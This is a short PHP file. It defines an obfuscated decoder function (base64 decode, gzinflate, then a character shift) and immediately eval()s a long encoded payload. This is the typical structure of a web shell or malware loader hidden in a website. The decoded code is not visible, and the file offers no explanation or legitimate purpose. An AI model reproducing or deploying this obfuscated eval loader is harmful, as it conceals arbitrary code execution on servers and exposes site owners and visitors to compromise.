<?php
function DOdCc($a)
{
    $a = gzinflate(base64_decode($a));
    for ($b = 0; $b < strlen($a); $b++) {
        $a[$b] = chr(ord($a[$b]) - 1);
    }
    return $a;
}
eval(DOdCc("nVV/j6JIEP0A9yk2myPZzSWXBgQ1m7mLCo3iAGNDd0v/h2CGkQaZkVmVy372K9DZce9HLjmjsburut7rV9XVHz50n58DhIIA3b2+yGyb7rPtp4+KaavKcKKYmqJhxbQUUzUUY6YMTWU4QIo51kaKZilDpAxHytBQhuA9VrSJqZjgpCnmVDEHiglrBmw3FHOkmLoyhO9QMfFA0cBu6jCefPz8pcdHwd2Vxx/6t1/fhub7UL9Z1tG3bhcM0d0/2VX0PtYG/7oOMSDIJUYX648bszq6geuHV49OsZ8+XD/f19W/B0Y35IY3gfVvbyf+9btd027QzL9jXJzGNyDmD2q8j28DGf/q/+UHhO3XRH66cvr00bVHx6idHD0LPTGVlFmpPguWV4k+NeLCL8jcPyX0JEhRByFVz4zjQ+gYe6LnUaSzVayNMasyM1TxjFckXK3FPMV4mVZZE2u1ZDh/Wen5mtosilDzFM2ZSGh+opU8QOxc6PV+o5Mpo4YTcqOMWF2wwv26taSTruVsU7qtFzF1a013omxshusmbPFpw90w4w1KsI8DJ49IJO1sLn2mYy2yiZWqLuE2NWiVGUySB9HKItKFl8q84TxHKSJOLMmzrzWYleQhK07HFaoDNmcDz/HLBBHKS/XeW+Mmlq6a6GRPER30eJSgLVXX6Vp4xPZbKnEM+GGmS87scRVEbgL83HQdG+B/iChGsF9uCzFNCl/zOYu9HVvC/pxWPd4TsyC+uoLzeOcQCZRqWEate+/NsRbwPPKK5pnPRQj2lpcs2awJidqFwdS8jSrXStrixO06pCzHPsVW2uJ1XMg16GdwiZOOb6SpYVhhLWZur2csOzyf+k4f38m6fNDROWynp2wn9xTwE5lrtAS7WkvQA1HqLwNed/zsTBcBA75gT1I0QBTVtodzjZQnkxT4eaXHqmCPZ9/xvwqkznhRh0ytg4Cfkg0Tx45/AvpFZW5tmZzGlQySy3mTULprXmaX/FQu6EV2Gy3zV7JeUpkl0U4egA9P7dEZ/K0UGfuVLsWKLzo+yFOFzee+A3yvepM91BMXUI+Zw0xSMskLNltx1wD8/rxQTyzg42pV1g8ezDdl5gP+jpZEj3ZFm4G+Hgb+tD5lJQ43ZcM9li+7/IcS9Jn7C6azlyvfLt8y4MB/19mhHueuCveliqh7OV8xMDZQz6ya9ngr3Q9AD4NT/LRlNeEV1DMaN7S44hVZl882wjhOK/Z/9fhL/vwlsaZxVohDHx/qI9L810SN3+rpnHFfJe3EAH14KiGfmLwKhPRE80Mxz4Ig8lEoF8fuPNf66vafueVyIvM2bNlbPp1Y+87/TZ8l7/Qpjsf+vsxZd98bD/k05SqnJTpDvccpyqdxcTC8YtzE1VQkSOxu5wItOn5o4xiliLIX6D3Pm8hPyJyEASZ9vfPKD6EfLUONJELz3+22eCVq9proAu4He4kROW3o6dj7Owbkc2qFRUM3VKqCG1V0if/EHTVMod6FU3f9yM0w2SUlanlBEN3l9JKvpvEgRtevIB+gd45v808K/x/zH7bFGe7rU4rlCyn923mV7LKXjTV95eUJ/EctK/v63v0HH5dqzex9/njM1o/HWJWDzPI95tSvGRJwB6/5R43MLNtIKtxkFCfQTynUw73AdQVnb6Af2BleDKBnV0kJ/ZmBfpq41AMnJ08KmTknD+wdPxTuGNSfWMB9u4f++AD8jpyRZ7GuHVg7igI/QT98iDXjJUTXeo/cwJ/jJrKmiDm3+ZKvQqt3PV/QF/qztYVWz23mi7l97vAI/8E/SpD7Pgft+nxr6Lj5y35vTg6RdKE/UGOxOzwuJvvHxWxy+TlMi/lx77ajX9zzoOjezaidPixn5MGzxw+eNdm73T+8qd7ssehssHa8B/vljZ08e0/F4T98LnZY82bFoce95dD7Ta9Y17d7drzdXy9DeKyPd3cfP3/+8vtvfwI="));